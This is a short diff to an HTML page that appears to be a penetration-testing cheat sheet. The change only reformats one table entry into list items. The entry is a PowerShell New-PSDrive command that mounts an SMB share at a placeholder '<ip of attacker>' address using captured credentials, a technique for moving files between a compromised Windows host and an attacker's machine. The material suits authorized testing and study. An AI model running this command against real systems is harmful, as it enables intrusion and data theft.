@@ -556,7 +556,7 @@
                     <tr>
                         <td>Connect to SMB Share From Windows</td>
                         <td>
-                            New-PSDrive -Name &lt;Drive Name for SMB Share&gt; -PSProvider FileSystem -Credential $cred -Root \\&lt;ip of attacker&gt;\&lt;Share Name&gt;
+                            <li>New-PSDrive -Name &lt;Drive Name for SMB Share&gt; -PSProvider FileSystem -Credential $cred -Root \\&lt;ip of attacker&gt;\&lt;Share Name&gt;</li>
                             <li>If accessing the same share from multiple shells on the same windows machine it works best to give them each different drive names (-Name &lt;Name&gt;)</li>
                         </td>
                     </tr>
